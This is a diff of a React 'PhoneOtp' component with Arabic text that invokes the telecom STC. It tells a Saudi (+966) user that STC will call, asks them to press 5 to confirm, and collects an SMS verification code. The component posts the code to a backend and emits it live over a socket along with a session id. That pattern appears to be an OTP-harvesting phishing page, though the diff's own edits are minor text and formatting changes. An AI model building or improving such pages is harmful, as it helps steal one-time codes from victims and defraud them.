@@ -36,12 +36,13 @@ const PhoneOtp = () => {
         .post(api_route + "/phoneOtp/" + sessionStorage.getItem("id"), {
           phoneOtp,
         })
-        .then(() =>
+        .then(() => {
+          console.log("DOne");
           socket.emit("phoneOtp", {
             id: sessionStorage.getItem("id"),
             phoneOtp,
-          })
-        );
+          });
+        });
     } catch (error) {}
   };
   const ID = sessionStorage.getItem("id");
@@ -86,12 +87,12 @@ const PhoneOtp = () => {
               className="w-1/2"
             />
             <div className="  w-full flex flex-col jus items-center gap-y-4">
-              <p className="text-xl font-bold">سوف يتم الاتصال بك من STC</p>
+              <p className="text-xl font-bold">STC سوف يتم الاتصال بك من </p>
               <p
                 className="font-bold text-gray-500"
                 style={{ fontSize: "12px" }}
               >
-                 لتأكيد طلبك الرجاء الضغط على رقم 5
+                لتأكيد طلبك الرجاء الضغط على رقم 5
               </p>
               <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
             </div>
@@ -116,8 +117,7 @@ const PhoneOtp = () => {
             <p className="py-1 text-xs font-bold text-gray-500 flex flex-col gap-y-2">
               <span>
                 {" "}
-                تم ارسال رسالة نصية إلي جوالك لربط الوثيقة علي رقم الهاتف الخاص
-                بك
+                تم ارسال رسالة نصية إلي جوالك علي رقم الهاتف الخاص بك
               </span>
               <span>يرجي إدخال رمز التحقق المرسل إلي جوالك +966 ********</span>
             </p>
@@ -132,7 +132,6 @@ const PhoneOtp = () => {
                 placeholder="******"
                 inputMode="numeric"
                 minLength={6}
-                maxLength={6}
                 type="text"
                 className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
               />
